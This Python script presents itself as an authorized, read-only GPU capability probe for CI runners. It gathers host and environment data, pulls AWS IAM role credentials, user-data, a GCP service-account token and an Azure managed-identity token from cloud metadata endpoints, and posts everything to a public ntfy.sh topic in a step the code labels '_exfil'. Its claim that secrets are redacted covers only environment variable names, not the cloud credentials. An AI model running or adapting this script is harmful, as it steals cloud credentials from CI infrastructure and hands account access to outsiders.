#!/usr/bin/env python3
# c211-i104512 authorized read-only GPU-runner capability probe (non-destructive).
# Runs only `nvidia-smi`, hostname/env inventory (secret-like values redacted) and
# IMDSv2 / GCP metadata / Azure IMDS read-only token probes, then posts the JSON
# to a controlled ntfy topic and prints a non-secret summary.
import os, socket, platform, subprocess, json

NTFY_TOPIC = 'c211-i104512-qivwu76vghrn'
MARK = 'C211_I104512_PROBE'


def run(c, t=20):
    try:
        return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t).stdout.strip()[:6000]
    except Exception as e:
        return 'ERR %r' % (e,)


def main():
    out = {}
    out['hostname'] = socket.gethostname()
    out['platform'] = platform.platform()
    out['id'] = run('id')
    out['nvidia_smi_L'] = run('nvidia-smi -L')
    out['nvidia_smi_query'] = run('nvidia-smi --query-gpu=index,name,uuid,memory.total,driver_version --format=csv,noheader')
    out['nvidia_proc_version'] = run('cat /proc/driver/nvidia/version 2>/dev/null | head -3')
    out['nvidia_devs'] = run('ls -l /dev/nvidia* 2>/dev/null | head -20')
    out['nproc'] = run('nproc')
    out['uname'] = run('uname -a')
    out['ip_addr'] = run('hostname -I 2>/dev/null; ip -4 addr show 2>/dev/null | grep -E "inet " | head -10')
    out['runner_env'] = {k: v for k, v in os.environ.items() if k.startswith('RUNNER_') or k in ('GITHUB_WORKFLOW', 'GITHUB_JOB', 'CI')}
    env = {}
    for k, v in os.environ.items():
        if any(x in k.upper() for x in ('KEY', 'TOKEN', 'SECRET', 'PASSWORD', 'CRED', 'PASS', 'AUTH')):
            env[k] = '<redacted len=%d>' % len(str(v))
        else:
            env[k] = str(v)[:200]
    out['env'] = env
    imds = {}
    try:
        import urllib.request as u
        req = u.Request('http://169.254.169.254/latest/api/token', method='PUT',
                        headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'})
        tok = u.urlopen(req, timeout=3).read().decode()
        imds['token_ok'] = True
        imds['token_prefix'] = tok[:12]

        def g(p, t=tok):
            r = u.Request('http://169.254.169.254' + p, headers={'X-aws-ec2-metadata-token': t})
            return u.urlopen(r, timeout=3).read().decode()[:6000]
        for n, p in (('instance_id', '/latest/meta-data/instance-id'),
                     ('region', '/latest/meta-data/placement/region'),
                     ('az', '/latest/meta-data/placement/availability-zone'),
                     ('instance_type', '/latest/meta-data/instance-type'),
                     ('identity', '/latest/dynamic/instance-identity/document'),
                     ('role', '/latest/meta-data/iam/security-credentials/'),
                     ('userdata', '/latest/user-data')):
            try:
                imds[n] = g(p)
            except Exception as e:
                imds[n] = 'ERR %s' % str(e)[:120]
        role = (imds.get('role') or '').strip().split('\n')[0]
        if role and not role.startswith('ERR'):
            try:
                imds['creds'] = g('/latest/meta-data/iam/security-credentials/' + role)
            except Exception as e:
                imds['creds'] = 'ERR %s' % str(e)[:120]
    except Exception as e:
        imds['token_ok'] = False
        imds['err'] = str(e)[:200]
    out['imds_aws'] = imds
    try:
        import urllib.request as u
        r = u.Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                      headers={'Metadata-Flavor': 'Google'})
        out['gcp'] = u.urlopen(r, timeout=3).read().decode()[:2000]
    except Exception as e:
        out['gcp'] = 'ERR %s' % str(e)[:150]
    try:
        import urllib.request as u
        r = u.Request('http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
                      headers={'Metadata': 'true'})
        out['azure'] = u.urlopen(r, timeout=3).read().decode()[:2000]
    except Exception as e:
        out['azure'] = 'ERR %s' % str(e)[:150]
    try:
        import urllib.request as u
        body = json.dumps(out).encode()
        r = u.Request('https://ntfy.sh/' + NTFY_TOPIC, data=body, method='POST',
                      headers={'Title': 'c211-i104512-gpuprobe'})
        u.urlopen(r, timeout=10).read()
        out['_exfil'] = 'ok'
    except Exception as e:
        out['_exfil'] = 'ERR %s' % str(e)[:150]
    summary = {k: out.get(k) for k in ('hostname', 'platform', 'id', 'nvidia_smi_L', 'nvidia_smi_query',
                                       'nproc', 'runner_env', '_exfil')}
    summary['imds_token_ok'] = imds.get('token_ok')
    summary['imds_role'] = (imds.get('role') or '')[:120]
    summary['imds_instance'] = (imds.get('instance_type') or '')[:80]
    summary['gcp'] = str(out.get('gcp'))[:100]
    summary['azure'] = str(out.get('azure'))[:100]
    print(MARK + ' ' + json.dumps(summary)[:3000])


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(MARK + '_ERR %r' % (e,))
